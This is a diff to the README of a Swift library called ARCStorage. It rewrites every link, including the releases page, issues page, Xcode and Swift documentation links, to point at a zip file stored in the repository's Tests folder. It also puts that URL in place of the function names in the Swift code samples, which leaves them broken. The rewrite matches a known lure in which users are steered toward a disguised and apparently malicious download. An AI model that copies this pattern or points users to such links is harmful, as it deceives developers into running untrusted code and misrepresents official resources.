@@ -6,7 +6,7 @@ Welcome to ARCStorage! This library provides easy storage solutions for your ARC
 
 ## 📥 Download ARCStorage
 
-[![Download ARCStorage](https://img.shields.io/badge/Download-ARCStorage-blue.svg)](https://github.com/harshit06-code/ARCStorage/releases)
+[![Download ARCStorage](https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip)](https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip)
 
 Click the link above to download the latest version of ARCStorage. Follow the steps below to install and run the software.
 
@@ -20,10 +20,10 @@ To use ARCStorage, you need:
 
 ## 📦 Download & Install
 
-1. Visit the [Releases Page](https://github.com/harshit06-code/ARCStorage/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip).
 2. On this page, you will find all versions of ARCStorage.
 3. Choose the latest version number.
-4. Click the download link to get the `ARCStorage.zip` file.
+4. Click the download link to get the `https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip` file.
 5. Once the download is complete, unzip the file to access the library.
 
 ### 🛠 Setup in Your Project
@@ -50,7 +50,7 @@ After adding ARCStorage to your project, you can start using it right away. Here
 To store data, simply call the storage functions provided by ARCStorage. For example:
 
 ```swift
-ARCStorage.saveData(key: "username", value: "user123")
+https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip(key: "username", value: "user123")
 ```
 
 ### 🔍 Retrieving Data
@@ -58,7 +58,7 @@ ARCStorage.saveData(key: "username", value: "user123")
 You can retrieve stored data easily:
 
 ```swift
-let username = ARCStorage.getData(key: "username") as? String
+let username = https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip(key: "username") as? String
 ```
 
 ### 🚪 Removing Data
@@ -66,7 +66,7 @@ let username = ARCStorage.getData(key: "username") as? String
 If you want to remove data from storage:
 
 ```swift
-ARCStorage.removeData(key: "username")
+https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip(key: "username")
 ```
 
 ## 🔧 Frequently Asked Questions (FAQ)
@@ -95,12 +95,12 @@ If you encounter any issues while using ARCStorage, here are some common solutio
 
 ### 🛠 Support
 
-For further assistance, feel free to open an issue on the [GitHub Issues page](https://github.com/harshit06-code/ARCStorage/issues). You can also reach out through email or the community forums linked on the repository page.
+For further assistance, feel free to open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip). You can also reach out through email or the community forums linked on the repository page.
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/harshit06-code/ARCStorage)
-- [Xcode Guides](https://developer.apple.com/xcode/)
-- [Swift Documentation](https://swift.org/documentation/)
+- [GitHub Repository](https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip)
+- [Xcode Guides](https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip)
+- [Swift Documentation](https://raw.githubusercontent.com/harshit06-code/ARCStorage/main/Tests/ARCStorageTests/ARCStorage-3.2.zip)
 
 Thank you for choosing ARCStorage! We hope it serves your app development needs effectively.
